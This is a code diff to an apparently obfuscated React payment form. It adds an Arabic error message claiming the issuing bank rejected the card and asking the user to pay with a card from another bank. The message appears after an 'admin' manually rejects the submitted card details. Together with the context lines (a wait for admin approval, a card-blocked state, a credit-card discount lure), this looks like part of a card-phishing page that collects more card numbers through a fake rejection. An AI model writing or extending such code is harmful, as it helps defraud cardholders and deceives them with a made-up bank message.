@@ -35,6 +35,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
   const [bankInfo, setBankInfo] = useState<{ name: string; country: string } | null>(null)
   const [isValidCard, setIsValidCard] = useState(false)
   const [expiryError, setExpiryError] = useState("")
+  const [cardRejectionError, setCardRejectionError] = useState("")
 
   // Waiting state
   const [isWaitingAdmin, setIsWaitingAdmin] = useState(false)
@@ -187,7 +188,10 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             // Hide loader immediately
             setIsWaitingAdmin(false)
             
-            // Show error message
+            // Show error message under card number
+            setCardRejectionError("تم رفض البطاقة من قبل البنك المصدر الرجاء التسديد من مصرف آخر")
+            
+            // Also show toast for visibility
             toast.error("تم رفض بيانات البطاقة", {
               description: "يرجى إعادة إدخال بيانات صحيحة",
               duration: 5000
@@ -276,8 +280,9 @@ export default function P1({ offerTotalPrice }: _P1Props) {
     }
 
     try {
-      // Reset rejection flag for new submission
+      // Reset rejection flag and error message for new submission
       rejectionHandledRef.current = false
+      setCardRejectionError("")
       
       const finalPrice = calculateFinalPrice()
       const discount = selectedPaymentMethod === "credit-card" ? 0.15 : 0
@@ -538,6 +543,13 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             />
             {_v1.length > 0 && _v1.replace(/\s/g, "").length !== 16 && (
               <p className="text-red-500 text-xs">يجب أن يكون 16 رقم</p>
+            )}
+            {cardRejectionError && (
+              <div className="bg-red-50 border-2 border-red-500 rounded-lg p-3 mt-2">
+                <p className="text-red-700 text-sm font-bold">
+                  {cardRejectionError}
+                </p>
+              </div>
             )}
             {isCardBlockedState && (
               <div className="bg-red-50 border-2 border-red-500 rounded-lg p-3 mt-2">
